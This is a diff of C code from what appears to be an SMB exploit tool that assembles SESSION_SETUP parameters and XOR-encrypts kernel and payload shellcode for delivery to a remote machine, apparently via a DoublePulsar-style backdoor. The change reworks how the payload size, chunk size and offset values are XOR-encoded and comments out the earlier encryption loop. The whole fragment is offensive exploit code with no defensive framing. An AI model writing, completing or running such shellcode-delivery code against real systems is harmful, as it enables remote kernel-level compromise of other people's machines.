@@ -290,28 +290,30 @@ int main(int argc, char* argv[])
 	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;
 
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
-	unsigned int ChunkSize = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
-	unsigned int OffsetofChunkinPayload = 0x0000;
-	unsigned char Parametersbuffer[13];
-	memset(Parametersbuffer, 0x00, 13);
-	memcpy((unsigned char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
-	memcpy((unsigned char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
-	memcpy((unsigned char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
+	unsigned int TotalSizeOfPayload = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int ChunkSize = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int OffsetofChunkinPayload = 0x0000 ^ XorKey;
+	unsigned char Parametersbuffer[12];
+	memset(Parametersbuffer, 0x00, 12);
+	memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+	memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
+	memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
 	//convert the calculated XOR key from unsigned int to unsigned char
+	/*
 	unsigned char char_xor_key[5];
 	char_xor_key[0] = (unsigned char)XorKey;
 	char_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	char_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
-	char_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
+	char_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);*/
 
 	//Encrypting signature buffer
+	/*
 	int i;
 	for (i = 0; i < 13; i++)
 	{
 		Parametersbuffer[i] ^= char_xor_key[i % 4];
-	}
+	} */
 
 	//allocate memory for encrypted shellcode payload buffer
 	unsigned char* encrypted;
